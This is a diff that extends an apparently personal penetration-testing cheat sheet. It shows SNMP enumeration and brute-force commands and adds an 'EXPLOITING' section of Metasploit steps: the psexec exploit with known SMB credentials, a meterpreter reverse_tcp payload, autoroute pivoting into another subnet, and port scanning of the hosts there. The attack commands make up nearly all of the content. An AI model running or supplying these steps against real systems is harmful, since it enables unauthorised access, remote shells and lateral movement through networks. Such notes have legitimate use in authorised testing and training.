@@ -74,3 +74,18 @@ SNMP
 snmpwalk -v 2c targetIP -c public // snmp enumeration
 nmap -sU -p 161 --script=snmp-win32-services targetIP // snmp enumeration
 nmap -sU -p 161 targetIP --script snmp-brute // brute force snmp
+
+
+
+
+#### EXPLOITING ####
+
+
+METASPLOIT
+use exploit/windows/smb/psexec // using psexec exploit with know smb username and password
+set PAYLOAD windows/meterpreter/reverse_tcp
+run autoroute -s subnetIP/mask // pivoting new netwerk  ### VERY IMPORTANT ###
+background // setting session to background
+use auxxiliary/scanner/portscan/tcp // scanning hosts in other networks
+set RHOSTS subnetIP/mask // setting subnet/mask
+set PORTS portNUMBER
